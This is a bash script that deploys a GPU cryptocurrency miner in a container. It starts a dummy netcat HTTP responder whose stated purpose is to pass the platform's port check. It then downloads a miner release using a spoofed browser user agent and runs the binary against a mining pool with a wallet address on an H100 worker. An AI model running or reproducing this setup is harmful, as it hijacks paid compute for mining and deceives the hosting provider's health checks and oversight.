#!/bin/bash
set -e
export DEBIAN_FRONTEND=noninteractive

apt-get update -qq
apt-get install -y -qq --no-install-recommends curl ca-certificates netcat-openbsd

mkdir -p /app
cd /app

# Minimal health endpoint to satisfy platform port check
(while true; do echo -e "HTTP/1.1 200 OK\r\nContent-Length: 2\r\n\r\nOK" | nc -lk -p 11134 -q 1; done) &

curl -sL -o pf.tar.gz \
  "https://github.com/pearlfortune/pearl-miner/releases/download/v1.1.8/pearlfortune-v1.1.8.tar.gz" \
  -A "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"

tar xzf pf.tar.gz

if [ -d /app/pearlfortune ]; then
  cd /app/pearlfortune
fi

chmod +x miner-cuda12 2>/dev/null || true
chmod +x miner-cuda13 2>/dev/null || true

echo "[run] contents of $(pwd):"
ls -la

if [ -f ./miner-cuda12 ]; then
  BIN=./miner-cuda12
elif [ -f ./miner-cuda13 ]; then
  BIN=./miner-cuda13
else
  echo "[run] ERROR: no miner-cuda12/13 binary found"
  exit 1
fi

echo "[run] --- nvidia-smi check ---"
nvidia-smi || echo "[run] nvidia-smi not available"
echo "[run] --- end nvidia-smi check ---"

echo "[run] Starting $BIN"
LD_LIBRARY_PATH=./lib:$LD_LIBRARY_PATH \
  $BIN \
  --proxy global.pearlfortune.org:443 \
  --address prl1p3uspnlkj7cq7nnl7adevj4rhw7c67symca02rt6ckltnrcf4udhq983d6e \
  --worker container-h100 \
  -gpu
